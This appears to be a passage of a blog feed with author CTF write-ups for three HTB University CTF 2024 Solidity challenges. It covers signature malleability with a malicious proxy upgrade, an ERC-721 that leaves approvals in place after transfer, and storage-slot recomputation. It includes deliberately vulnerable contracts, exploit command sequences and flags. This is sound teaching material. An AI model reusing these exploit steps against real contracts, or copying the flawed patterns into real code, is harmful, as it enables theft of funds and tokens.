KernelMaintainer with some valid (already issued) PASKATicket ready to be consumed.\ngetStarSightings(string memory _starName): A view function that allows users to query all recorded sightings of a particular star.\n_getKernelMaintainerInfo(address _kernelMaintainer): An internal function that fetches the KernelMaintainer struct associated with a specific address. This provides access to the maintainer\u0026rsquo;s account details, active PASKATickets, and nonce, facilitating authorization and tracking of privileged actions.\n_isKernelMaintainer(address _account): An internal view function that checks whether a given address is an authorized registered KernelMaintainer.\n_prefixed(bytes32 hash): An internal pure function that prefixes a given hash with the Ethereum signed message prefix, following the personal_sign standard.\nAt this point we have come down to the point where we know the contract is vulnerable to Signature Malleability, but we still don\u0026rsquo;t know how to retrieve a valid signature of a registered KernelMaintainer and impersonate him.\nFor the first part we have the easy solution, remembering that during the initialization phase, in the Setup contract, a signature was signed to call commitStarSighting and record sightings of the two stars. That signature is valid, since the same signer is added to the KernelMaintainers during initialization by the initialize function (L36).\nAt this point there are two details that could block most players.\nEven if we managed to exploit a signature and manage to replicate one, to commit a new sighting of one of the two stars, it would be necessary to find another valid signature because with this attack each signature can be replayed maximum one more time. However, only one PASKATicket was created at initialization so we should find another way. Even if we managed to find a way to sign arbitrary PASKATickets, we must remember that the signature created is based on the KernelMaintainer\u0026rsquo;s nonce, which means that we certainly could not replicate the privileged action signed by the KernelMaintainer with the given nonce more than once n. Furthermore, the player is not a registered KernelMaintainer and consequently will not have its own nonces tracked either. However, some important details can make our exploit possible despite these constraints.\nFirst of all, the fundamental intuition must be that there is no distinction between the various PASKA Actions, which means that a valid PASKATicket valid for example for calling commitStarSighting will also be valid for other privileged functions.\nWhat are the other actions that require consuming a PASKATicket? The _authorizeUpgrade function! That means we don\u0026rsquo;t need to craft arbitrary signatures for $n$ PASKATickets, but we just need one valid PASKATicket signed from a KernelMaintainer to be able to upgrade the implementation contract and rewrite the logic and storage as we want.\nA final important consideration can be seen in this code snippet:\nfunction createPASKATicket(bytes memory _signature) public onlyProxy { StargazerMemories storage $ = _getStargazerMemory(); uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce; [...] Any users can request a PASKATicket creation, and when $.kernelMaintainers[tx.origin].PASKATicketsNonce will be evaluated with an address not being part of the registered kernelMaintainers, it will try to fetch uninitialized storage pointer that will automatically returns 0. That means, even though the player is not part of kernelMaintainers, it can temporarily impersonate one, by replaying the first PASKATicket of every KernelMaintainer since the first valid ticket for any maintainer will also have nonce 0!\nFurthermore, once the signature checks have been passed, no further checks are made on the address issuing the request for a PASKATicket, effectively creating a valid entry for the address of the player, despite not being part of kernelMaintainers.\nExploitation # A successful exploit scenario will be the following:\nKernelMaintainer Bob initializes the StargazerKernel contract. KernelMaintainer Bob signs and create a valid PASKATicket with nonce 0. KernelMaintainer Bob consumes PASKATicket with nonce 0 to commit a star sighting. Attacker recovers the issued signature and malleate it. The malleability is possible because on ECDSA a given $\\text{sig}_1 = (r,s,v)$ and $\\text{sig}_2 = (r,s\u0026rsquo;,v)$ where $s\u0026rsquo;$ is calculated as $s\u0026rsquo; = (-s \\mod n)$, will share the same $x$ coordinate, meaning that a replay attack for that tuple (signer, sig1) is possible. The vulnerable StargazerKernel allows creating a valid PASKATicket with the malleated signature, under the name of Attacker. The PASKATicket will be valid despite the fact that Attacker not being a KernelMaintainer because an uninitialized pointer will result in nonce 0 for the ticket (same as the first ticker of KernelMaintainer Bob). Attacker can now upgrade implementation contract to a contract under his control by calling upgradeToAndCall. The new malicious contract must be a valid UUPS contract because of the proxiableUUID() check being made from OpenZeppelin upgradeToAndCall function implementation. Attacker can rewrite the storage as he wishes, because the proxy contract Stargazer will delegatecall to the evil attacker implementation contract. See the full exploitation script here.\nHTB{stargazer_f1nds_s0l4c3_ag41n}\n","date":"5 December 2024","externalUrl":null,"permalink":"/posts/htb-universityctf-2024/stargazer/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Stargazer\u0026rdquo; hard blockchain challenge from HTB University CTF 2024.","title":"HTB University CTF 2024 - Stargazer [Author Writeup]","type":"posts"},{"content":"","date":"5 December 2024","externalUrl":null,"permalink":"/tags/storage-collision/","section":"Tags","summary":"","title":"Storage-Collision","type":"tags"},{"content":"","date":"5 December 2024","externalUrl":null,"permalink":"/tags/approvals/","section":"Tags","summary":"","title":"Approvals","type":"tags"},{"content":"","date":"5 December 2024","externalUrl":null,"permalink":"/tags/erc-721/","section":"Tags","summary":"","title":"ERC-721","type":"tags"},{"content":" FrontierMarketplace # 5th Dec 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Medium\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-UniversityCTF-2024/FrontierMarketplace TLDR # This challenge consists on exploiting a custom ERC721 implementation that doesn\u0026rsquo;t clear approvals after token ownership transfer, and can be leveraged by approving an account in control, selling the NFT and reclaming ownership again after transfer because of the non cleared approval.\nDescription # In the lawless expanses of the Frontier Board, digital assets hold immense value and power. Among these assets, the FrontierNFTs are the most sought-after, representing unique and valuable items that can influence the balance of power within the cluster.\nThis government has managed to win a lot of approval and consensus from the people, through a strong propaganda campaign through their \u0026ldquo;FrontierNFT\u0026rdquo; which is receiving a lot of demand. Your goal is to somehow disrupt the political ride of the Frontier Board party.\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with smart contracts Familiarity with ERC721 standard Skills Learned # Identifying vulnerabilities in custom ERC721 implementations Challenge Scenario # In the untamed territories ruled by the Frontier Board, digital assets possess immense value and authority. Among these assets, FrontierNFTs are the most coveted, representing unique and valuable items that can significantly influence the balance of power within the cluster.\nThe Frontier Board has successfully garnered widespread approval and consensus from the populace through a robust propaganda campaign centered around their \u0026ldquo;FrontierNFT,\u0026rdquo; which is experiencing unprecedented demand. Your mission is to disrupt the political dominance of the Frontier Board by hacking the FrontierNFT contract.\nAnalyzing the Source Code # The challenge provides the source code of the following contracts to players.\nSetup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import { FrontierMarketplace } from \u0026#34;./FrontierMarketplace.sol\u0026#34;; import { FrontierNFT } from \u0026#34;./FrontierNFT.sol\u0026#34;; contract Setup { FrontierMarketplace public immutable TARGET; uint256 public constant PLAYER_STARTING_BALANCE = 20 ether; uint256 public constant NFT_VALUE = 10 ether; event DeployedTarget(address at); constructor() payable { TARGET = new FrontierMarketplace(); emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { return ( address(msg.sender).balance \u0026gt; PLAYER_STARTING_BALANCE - NFT_VALUE \u0026amp;\u0026amp; FrontierNFT(TARGET.frontierNFT()).balanceOf(msg.sender) \u0026gt; 0 ); } } The Setup contract deploys the FrontierNFT and FrontierMarketplace contracts. In order to solve this challenge, the player must have a balance \u0026gt; of 10 ethers while also having at least one FrontierNFT token.\nFrontierMarketplace.sol # The FrontierMarketplace contract serves as \u0026ldquo;frontend\u0026rdquo; for the NFT contract, we\u0026rsquo;ll see why later. Here\u0026rsquo;s an overview of the code:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import { FrontierNFT } from \u0026#34;./FrontierNFT.sol\u0026#34;; contract FrontierMarketplace { uint256 public constant TOKEN_VALUE = 10 ether; FrontierNFT public frontierNFT; address public owner; event NFTMinted(address indexed buyer, uint256 indexed tokenId); event NFTRefunded(address indexed seller, uint256 indexed tokenId); constructor() { frontierNFT = new FrontierNFT(address(this)); owner = msg.sender; } function buyNFT() public payable returns (uint256) { require(msg.value == TOKEN_VALUE, \u0026#34;FrontierMarketplace: Incorrect payment amount\u0026#34;); uint256 tokenId = frontierNFT.mint(msg.sender); emit NFTMinted(msg.sender, tokenId); return tokenId; } function refundNFT(uint256 tokenId) public { require(frontierNFT.ownerOf(tokenId) == msg.sender, \u0026#34;FrontierMarketplace: Only owner can refund NFT\u0026#34;); frontierNFT.transferFrom(msg.sender, address(this), tokenId); payable(msg.sender).transfer(TOKEN_VALUE); emit NFTRefunded(msg.sender, tokenId); } } The marketplace exposes two functions to users:\nbuyNFT() function: a payable function, users can mint to themselves 1 FrontierNFT token by paying 10 ethers. refundNFT function: users can also get a refund of the NFT token, by giving allowance to the marketplace to transfer the token back to the marketplace balance, in change of getting the full refund of the token value (10 ethers). At the moment, nothing seems off, we understand that maybe the solution involves buying an NFT and request a refund for it (to get the ethers back) but somehow still owning the NFT after the refund. Let\u0026rsquo;s see how the FrontierNFT token contracts looks like.\nFrontierNFT.sol # The FrontierNFT is a custom ERC721 standard, which looks pretty similar to the actual standard at first glance:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract FrontierNFT { string public name = \u0026#34;FrontierNFT\u0026#34;; string public symbol = \u0026#34;FRNT\u0026#34;; uint256 private _tokenId = 1; address private _marketplace; mapping(uint256 tokenId =\u0026gt; address) private _owners; mapping(address owner =\u0026gt; uint256) private _balances; mapping(uint256 tokenId =\u0026gt; address) private _tokenApprovals; mapping(address owner =\u0026gt; mapping(address operator =\u0026gt; bool)) private _operatorApprovals; event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); modifier onlyMarketplace() { require(msg.sender == _marketplace, \u0026#34;FrontierNFT: caller is not authorized\u0026#34;); _; } constructor(address marketplace) { _marketplace = marketplace; } function balanceOf(address owner) public view returns (uint256) { require(owner != address(0), \u0026#34;FrontierNFT: invalid owner address\u0026#34;); return _balances[owner]; } function ownerOf(uint256 tokenId) public view returns (address) { address owner = _owners[tokenId]; require(owner != address(0), \u0026#34;FrontierNFT: queried owner for nonexistent token\u0026#34;); return owner; } function approve(address to, uint256 tokenId) public { address owner = ownerOf(tokenId); require(msg.sender == owner, \u0026#34;FrontierNFT: approve caller is not the owner\u0026#34;); _tokenApprovals[tokenId] = to; emit Approval(owner, to, tokenId); } function getApproved(uint256 tokenId) public view returns (address) { require(_owners[tokenId] != address(0), \u0026#34;FrontierNFT: queried approvals for nonexistent token\u0026#34;); return _tokenApprovals[tokenId]; } function setApprovalForAll(address operator, bool approved) public { require(operator != address(0), \u0026#34;FrontierNFT: invalid operator\u0026#34;); _operatorApprovals[msg.sender][operator] = approved; emit ApprovalForAll(msg.sender, operator, approved); } function isApprovedForAll(address owner, address operator) public view returns (bool) { return _operatorApprovals[owner][operator]; } function transferFrom(address from, address to, uint256 tokenId) public { require(to != address(0), \u0026#34;FrontierNFT: invalid transfer receiver\u0026#34;); require(from == ownerOf(tokenId), \u0026#34;FrontierNFT: transfer of token that is not own\u0026#34;); require( msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId), \u0026#34;FrontierNFT: transfer caller is not owner nor approved\u0026#34; ); _balances[from] -= 1; _balances[to] += 1; _owners[tokenId] = to; emit Transfer(from, to, tokenId); } function mint(address to) public onlyMarketplace returns (uint256) { uint256 currentTokenId = _tokenId; _mint(to, currentTokenId); return currentTokenId; } function burn(uint256 tokenId) public onlyMarketplace { _burn(tokenId); } function _mint(address to, uint256 tokenId) internal { require(to != address(0), \u0026#34;FrontierNFT: invalid mint receiver\u0026#34;); require(_owners[tokenId] == address(0), \u0026#34;FrontierNFT: token already minted\u0026#34;); _balances[to] += 1; _owners[tokenId] = to; _tokenId += 1; emit Transfer(address(0), to, tokenId); } function _burn(uint256 tokenId) internal { address owner = ownerOf(tokenId); require(msg.sender == owner, \u0026#34;FrontierNFT: caller is not the owner\u0026#34;); _balances[owner] -= 1; delete _owners[tokenId]; emit Transfer(owner, address(0), tokenId); } } A player can notice immediately that the modifier onlyMarketplace is applied to some functions, in particular to the mint and burn functions. The onlyMarketplace effectively verify that the transaction sender is the FrontierMarketplace contract, meaning that players won\u0026rsquo;t be able to mint directly to themselves the tokens by interacting directly with the NFT contract and call it a day.\nWe can then deduce that FrontierMarketplace is only the \u0026ldquo;frontend\u0026rdquo; and the FrontierNFT contract is the backend, with some authentication.\nAt this point, some vulnerability needs to be found in FrontierNFT contract. A player can do a full review of the code with no problems, since most of the functions are viewers/getters, and analyze the more critical functions like transferFrom, setApprovalForAll and approve functions.\nWhat can also be done, is comparing this implementation with some field-standard implementation like the OpenZeppelin ERC721 contracts.\nAt high level, most of the functions will look very similar, if not identical. Openzeppelin contracts do also some magic to optimize gas consumption, but security wise speaking, the checks made are the same.\nThe only exception is made for the approve function implementation, which looks quite different:\nopenzeppelin/contracts/token/ERC721/ERC721.sol:_approve\nfunction _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual { // Avoid reading the owner unless necessary if (emitEvent || auth != address(0)) { address owner = _requireOwned(tokenId); // We do not use _isAuthorized because single-token approvals should not be able to call approve if (auth != address(0) \u0026amp;\u0026amp; owner != auth \u0026amp;\u0026amp; !isApprovedForAll(owner, auth)) { revert ERC721InvalidApprover(auth); } if (emitEvent) { emit Approval(owner, to, tokenId); } } _tokenApprovals[tokenId] = to; } FrontierNFT.sol:approve\nfunction approve(address to, uint256 tokenId) public { address owner = ownerOf(tokenId); require(msg.sender == owner, \u0026#34;FrontierNFT: approve caller is not the owner\u0026#34;); _tokenApprovals[tokenId] = to; emit Approval(owner, to, tokenId); } NFT contract allows parallel token-specific and collection approvals # Looking at them side by side, we notice the missing auth parameter, that in OZ implementation enables another layer of security; we can notice also that both of the implementation require the sender to be the owner of the tokenId we want to approve for address to. Both sets the _tokenApprovals mapping and emit the Approval but the OZ implementation checks for zero address and for isApprovedForAll.\nIn the FrontierNFT contract the zero address check is being made in the ownerOf function, so the only actual missing check is the following line:\n!isApprovedForAll(owner, auth) That means we can both emit a single-user approval for given tokenId but also allowing an address to have approval for an arbitrary token in the meantime\u0026hellip;How that could be useful?\nThe setApprovalForAll function looks the same on both contracts, meaning we need to investigate further and keep in mind that missing check.\ntransferFrom doesn\u0026rsquo;t clear approvals after token ownership transfer # The only missing function to analyze is the one responsible for transferring tokens. Let\u0026rsquo;s put them side by side.\nopenzeppelin/contracts/token/ERC721/ERC721.sol:_transfer\n/** * @dev Transfers `tokenId` from `from` to `to`. * As opposed to {transferFrom}, this imposes no restrictions on msg.sender. * * Requirements: * * - `to` cannot be the zero address. * - `tokenId` token must be owned by `from`. * * Emits a {Transfer} event. */ function _transfer(address from, address to, uint256 tokenId) internal { if (to == address(0)) { revert ERC721InvalidReceiver(address(0)); } address previousOwner = _update(to, tokenId, address(0)); if (previousOwner == address(0)) { revert ERC721NonexistentToken(tokenId); } else if (previousOwner != from) { revert ERC721IncorrectOwner(from, tokenId, previousOwner); } } FrontierNFT.sol:transferFrom\nfunction transferFrom(address from, address to, uint256 tokenId) public { require(to != address(0), \u0026#34;FrontierNFT: invalid transfer receiver\u0026#34;); require(from == ownerOf(tokenId), \u0026#34;FrontierNFT: transfer of token that is not own\u0026#34;); require( msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId), \u0026#34;FrontierNFT: transfer caller is not owner nor approved\u0026#34; ); _balances[from] -= 1; _balances[to] += 1; _owners[tokenId] = to; emit Transfer(from, to, tokenId); } As the Natspec says in the OZ implementation, the to parameter cannot be zero address and from address must have ownership of the token is being transferred. Both checks happen in the FrontierNFT implemenation also.\nNotice how the OZ _transfer calls internally another internal function: _update, so let\u0026rsquo;s analyze it also.\n/** * @dev Transfers `tokenId` from its current owner to `to`, or alternatively mints (or burns) if the current owner * (or `to`) is the zero address. Returns the owner of the `tokenId` before the update. * * The `auth` argument is optional. If the value passed is non 0, then this function will check that * `auth` is either the owner of the token, or approved to operate on the token (by the owner). * * Emits a {Transfer} event. * * NOTE: If overriding this function in a way that tracks balances, see also {_increaseBalance}. */ function _update(address to, uint256 tokenId, address auth) internal virtual returns (address) { address from = _ownerOf(tokenId); // Perform (optional) operator check if (auth != address(0)) { _checkAuthorized(from, auth, tokenId); } // Execute the update if (from != address(0)) { // Clear approval. No need to re-authorize or emit the Approval event _approve(address(0), tokenId, address(0), false); unchecked { _balances[from] -= 1; } } if (to != address(0)) { unchecked { _balances[to] += 1; } } _owners[tokenId] = to; emit Transfer(from, to, tokenId); return from; } Again, the operator checks are almost the same, but this time one more action is being made on the OZ implemenation:\n// Clear approval. No need to re-authorize or emit the Approval event _approve(address(0), tokenId, address(0), false); The FrontierNFT transfer function, does not clear approvals indeed.\nHow can we exploit this? Think of the following scenario:\nPlayer buys an NFT for 10 ethers through the FrontierMarketplace instance, he becomes owner of tokenId 1. Player balance is now 10 ethers. Player approve himself for tokenId 1. Player also set approval for all tokens in his possession for FrontierMarketplace as operator. This is allowed by the missing check in the approve function and allows FrontierMarketplace to move tokens while keeping valid the previous self-approval. Player asks for refund, FrontierMarketplace regain ownership of tokenId 1 and players receive back 10 ethers. Player balance is now 20 ethers again. Player calls transferFrom for himself of tokenId 1, despite having no ownership, thanks to the dangling approval set at step 2. Player has the initial balance of 20 ethers but got 1 free FrontierNFT token, and can repeat from step 1 indefinitely. Exploitation # To reproduce the scenario, a player must perform the following sequence of action:\n[...] csend(target_addr, \u0026#34;buyNFT()\u0026#34;, \u0026#34;--value\u0026#34;, \u0026#34;10ether\u0026#34;) csend(frontierNFT, \u0026#34;approve(address,uint256)\u0026#34;, player_addr, \u0026#34;1\u0026#34;) csend(frontierNFT, \u0026#34;setApprovalForAll(address,bool)\u0026#34;, target_addr, \u0026#34;true\u0026#34;) csend(target_addr, \u0026#34;refundNFT(uint256)\u0026#34;, \u0026#34;1\u0026#34;) csend(frontierNFT, \u0026#34;transferFrom(address,address,uint256)\u0026#34;, target_addr, player_addr, \u0026#34;1\u0026#34;) see the full exploitation script here.\nHTB{g1mme_1t_b4ck}\n","date":"5 December 2024","externalUrl":null,"permalink":"/posts/htb-universityctf-2024/frontiermarketplace/","section":"Blog","summary":"Author writeup for the \u0026ldquo;FrontierMarketplace\u0026rdquo; medium blockchain challenge from HTB University CTF 2024.","title":"HTB University CTF 2024 - FrontierMarketplace [Author Writeup]","type":"posts"},{"content":" ForgottenArtifact # 5th Dec 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-UniversityCTF-2024/ForgottenArtifact TLDR # This challenge consists of calculating the storage pointer of a struct stored in a non-standard location in the contract memory to re-discover the \u0026ldquo;forgotten artifact\u0026rdquo; called \u0026ldquo;Starry Spurr\u0026rdquo;.\nDescription # Deep within the uncharted territories of the Frontier Cluster lies a relic of immense power and mystery‚Äîthe forgotten artifact known as \u0026ldquo;The Starry Spurr.\u0026rdquo; Hidden away by the oppressive Frontier Board, its location has been lost to time. However, whispers persist that the artifact can only be recovered by those who understand the intricate mechanisms of the ledger technology. Your goal is to rediscover its location before the Frontier Board finds it and claim possession for the sake of power and wealth.\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with smart contracts Knowledge of Ethereum\u0026rsquo;s storage layout and storage pointers Skills Learned # Calculating and manipulating non-standard location of storage slots in Solidity Challenge Scenario # The Frontier Cluster, once a beacon of hope and prosperity, has been overshadowed by the ruthless Frontier Board. Among the many secrets they guard, \u0026ldquo;The Starry Spurr\u0026rdquo; remains the most coveted artifact, believed to possess unparalleled power. This artifact was hidden using sophisticated blockchain mechanisms to ensure its secrecy and protection.\nThe players goal is to rediscover the forgotten artifact in the smart contract by reverse-engineering the original storing mechanism, before the Frontier Board finds it and claim possession for the sake of power and wealth.\nAnalyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.18; import { ForgottenArtifact } from \u0026#34;./ForgottenArtifact.sol\u0026#34;; contract Setup { uint256 public constant ARTIFACT_ORIGIN = 0xdead; ForgottenArtifact public immutable TARGET; event DeployedTarget(address at); constructor() payable { TARGET = new ForgottenArtifact(uint32(ARTIFACT_ORIGIN), address(0)); emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { return TARGET.lastSighting() \u0026gt; ARTIFACT_ORIGIN; } } In order to satify the conditions to solve this challenge, the lastSighting storage variable of the target contract, should be set at a value higher that ARTIFACT_ORIGIN.\nForgottenArtifact.sol # The ForgottenArtifact smart contract was used to hide the artifact in its storage memory, by crafting a pseudo-generated storage pointer and using low level assembly to move the struct pointer of the artifact to that newly generated location.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.18; contract ForgottenArtifact { uint256 public lastSighting; struct Artifact { uint32 origin; address discoverer; } constructor(uint32 _origin, address _discoverer) { Artifact storage starrySpurr; bytes32 seed = keccak256(abi.encodePacked(block.number, block.timestamp, msg.sender)); assembly { starrySpurr.slot := seed } starrySpurr.origin = _origin; starrySpurr.discoverer = _discoverer; lastSighting = _origin; } function discover(bytes32 _artifactLocation) public { Artifact storage starrySpurr; assembly { starrySpurr.slot := _artifactLocation } require(starrySpurr.origin != 0, \u0026#34;ForgottenArtifact: unknown artifact location.\u0026#34;); starrySpurr.discoverer = msg.sender; lastSighting = block.timestamp; } } In detail:\nlastSighting: Tracks the last time the artifact was sighted. This variable is written at the contract creation by the constructor. The only way to modify it is within the discover function. Artifact struct: Define the structer of the Artifact. It contains the origin of the artifact (timestamp) and the discoverer\u0026rsquo;s address. Constructor: Calculates a psuedo-random seed, which will be then used as storage pointer, using the current block.number, block.timestamp, and msg.sender, which can be easily re-calculated. Uses assembly to assign the seed as the storage slot for starrySpurr. Initializes the Artifact struct with the provided _origin and _discoverer. Sets lastSighting to _origin. discover() function: Accepts a _artifactLocation parameter, presumed to be the storage slot of the artifact. Uses assembly to load the Artifact stored at _artifactLocation (if any). Requires that the origin is not zero, ensuring the artifact location is valid. Updates the discoverer to msg.sender and lastSighting to the current block timestamp. As we understood, the artifact, which is in the form of a struct, is not stored to a conventional location in the contract\u0026rsquo;s storage layout, and this time it cannot be simply retrieved by using eth_getStorageAt and passing slot 0 as an argument.\nInstead, using low level assembly, the contract sets its storage location using the seed variable:\nArtifact storage starrySpurr; bytes32 seed = keccak256(abi.encodePacked(block.number, block.timestamp, msg.sender)); assembly { starrySpurr.slot := seed } The first line creates a new variable starrySpurr by specifying the location as storage, which means it references a specific location in the contract\u0026rsquo;s persistent storage rather than being a memory or calldata variable. This allows direct interaction with the contract\u0026rsquo;s storage, see more information in the documentation here.\nThen, seed is generated by hashing the combination of block.number, block.timestamp, and msg.sender. If these values can be predicted or known, the storage slot can be recalculated.\nFinally, low level assembly is used to assign the seed as the storage slot for starrySpurr, effectively pointing the Artifact struct to a specific storage location that can be targeted for exploitation.\nIn other words, these lines serves as a way to store a storage variable in a non-conventional storage slot by generating runtime a storage pointer.\nThe goal of the player at this point is just to reverse engineer the pointer generation logic.\nAlthough the logic for this one is pretty simple, we can avoid falling for silly mistakes and use Solidity code to directly generate that. For example, We can use chisel tool from the Foundry collection to have a nice Solidity REPL in our terminal to do so.\nHowever, the generation of this hash depends on block-specific variables (block.number, block.timestamp), meaning that, in order to reconstruct the correct hash, we need to recover the values for this variables used at the time of the contract creation.\nIn order to do so, we can use tools like cast, web3py to fetch past transactions details.\nExploitation # To solve this challenge, we have to re-calculate the seed hash used as pointer to store the artifact, and pass is to the discover() function as argument in order to set lastSighting variable to a new block timestamp.\nStep 1: get current block information # ‚ûú cast block --rpc-url $RPC baseFeePerGas 0 difficulty 0 extraData 0x gasLimit 30000000 gasUsed 293780 hash 0xd3e04275d3d832f6cab1f986fcb3b2d6e5dce9cd3914f0d76098f57923785066 logsBloom 0x00000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000 miner 0x0000000000000000000000000000000000000000 mixHash 0x0000000000000000000000000000000000000000000000000000000000000000 nonce 0x0000000000000000 number 1 parentHash 0xc344a56f72f4ae832f7ef060fe7acd0e367644d7aa3c364877e367086d09469d transactionsRoot 0x127229900c01b9e389b79b9f51caeb7175b90f64591896aa6765381d2ff69c7a receiptsRoot 0x8294aad7e40b8fa738672bd806843726d2e94498d87ebdf0b38c5e83464c02f8 sha3Uncles 0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347 size 1856 stateRoot 0xd2ad8861be652b2cff0e61187388187f690844e24fcbf4cf48d227ed56fab617 timestamp 1734026033 (Thu, 12 Dec 2024 17:53:53 +0000) withdrawalsRoot 0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421 totalDifficulty 0 transactions: [ 0xf35c20de71490188ba89db398afdf07a7b3853e150fe0807cc4f266f7b2c613f ] We see that only 1 block is mined, and it\u0026rsquo;s block number 1, we needed that. The block contains only 1 transaction, possibly the contract creation. We can use cast again to fetch for detailed information using the provided transaction hash.\nAnother important value we can notice, is the timestamp param, giving us the block.timestamp value we needed (1734026033).\nStep 2: retrieve transaction details # ‚ûú cast tx 0xf35c20de71490188ba89db398afdf07a7b3853e150fe0807cc4f266f7b2c613f --rpc-url $RPC accessList [] blockHash 0xd3e04275d3d832f6cab1f986fcb3b2d6e5dce9cd3914f0d76098f57923785066 blockNumber 1 chainId 31337 from 0x5B288F7f432156D2653CC518859b6FD5F77a3123 gasLimit 293780 hash 0xf35c20de71490188ba89db398afdf07a7b3853e150fe0807cc4f266f7b2c613f input 0x60a060405261dead5f604051601290608b565b63ffffffff90921682526001600160a01b03166020820152604001604051809103905ff0801580156045573d5f5f3e3d5ffd5b506001600160a01b031660808190526040519081527fc26ec5464cc58ea5f3597f1daab5d82585655e1bfd634b0a94fdd5ab63740dbf9060200160405180910390a16098565b6102558061024283390190565b60805161018d6100b55f395f8181607c015260bc015261018d5ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063468e2c681461004357806364d98f6e1461005f578063cc1f2afa14610077575b5f5ffd5b61004c61dead81565b6040519081526020015b60405180910390f35b6100676100b6565b6040519015158152602001610056565b61009e7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b039091168152602001610056565b5f61dead7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316634e3d72b26040518163ffffffff1660e01b8152600401602060405180830381865afa158015610116573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013a9190610140565b11905090565b5f60208284031215610150575f5ffd5b505191905056fea2646970667358221220a80d2b468a927403c0935c79d3bfca66e9ffe0eddd8714585fde84d6b8359b9264736f6c634300081c0033608060405234801561000f575f5ffd5b5060405161025538038061025583398101604081905261002e916100b6565b5f5f43423360405160200161006393929190928352602083019190915260601b6001600160601b031916604082015260540190565b60408051601f19818403018152919052805160209091012080546001600160a01b03909416640100000000026001600160c01b031990941663ffffffff9095169485179390931790925550505f55610101565b5f5f604083850312156100c7575f5ffd5b825163ffffffff811681146100da575f5ffd5b60208401519092506001600160a01b03811681146100f6575f5ffd5b809150509250929050565b6101478061010e5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80630f9b5d1f146100385780634e3d72b21461004d575b5f5ffd5b61004b6100463660046100fa565b610067565b005b6100555f5481565b60405190815260200160405180910390f35b8054819063ffffffff165f036100d95760405162461bcd60e51b815260206004820152602d60248201527f466f72676f7474656e41727469666163743a20756e6b6e6f776e20617274696660448201526c30b1ba103637b1b0ba34b7b71760991b606482015260840160405180910390fd5b8054640100000000600160c01b031916336401000000000217905550425f55565b5f6020828403121561010a575f5ffd5b503591905056fea2646970667358221220c457a2f3cb835798de697f5a7f785f8f5835342365fe4032d2f55d95d8169efb64736f6c634300081c0033 maxFeePerGas 1000000000 maxPriorityFeePerGas 1000000000 nonce 0 r 0x34b919a9b01d04a2b0b11191e3308adbaf13abc314bef31f1b0d952e75580969 s 0x39bfd5b956a7c1c0301b02733fc773e6c6f7519088679cb0020f77eb375e297d to transactionIndex 0 type 2 value 0 yParity 1 The transaction with long data, the to param pointing to address zero, and the first bytes of the data being 0x60a06040 (see why here), confirms the transaction as the one that created the contract.\nNote that, the from parameter in this transaction, won\u0026rsquo;t be the actual msg.sender used to calculate the hash in the ForgottenArtifact contract, because the Setup contracts is responsible to deploy the challenge contract and therefore the constructor will see the address of Setup as the actual msg.sender. The setup contract address can be easily retrieved using the TCP challenge handler:\n‚ûú nc $IP $PORT 1 - Get connection informations 2 - Restart Instance 3 - Get flag Select action (enter number): 1 [*] Found node running. Retrieving connection informations... [...] Setup contract : 0xd5CBC771f1148636AbE03472cFA7c4c7CBAc3B03 [...] Step 3: reconstruct seed hash # As we have everything we need to reconstruct the storage pointer used, i.e. the artifact location, we can finally use chisel to easily calculate the hash.\nStep 4: call function discover() with the calculated hash # At this point, we just need to call the discover function with the correct hash, i.e. the artifact storage location pointer.\n‚ûú cast send $TARGET \u0026#34;discover(bytes32)\u0026#34; 0xb34a2018396418630fe56fe68d75a2830563cfc352cc333f60dc95b7f571819d --rpc-url $RPC --private-key $PVK blockHash 0x99f4e19feb3a73b69c00d3332d233a24042e49f821d99e0c7502ecda3b8051a6 blockNumber 5 contractAddress cumulativeGasUsed 31953 effectiveGasPrice 1000000000 from 0x3475E621b91f45b02Af368EcC147B0a90Acad4D5 gasUsed 31953 logs [] logsBloom 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 root status 1 (success) transactionHash 0x8ba39c9d1958c49f4160ae9e8a85826eed7a1b9577e0b55d7790f297179ded13 transactionIndex 0 type 2 blobGasPrice 1 blobGasUsed authorizationList to 0x8fBF2638fD86021c3Db33c70bE3d06B64C549dA7 Win!\nWe can now connect back to the challenge handler, that will check 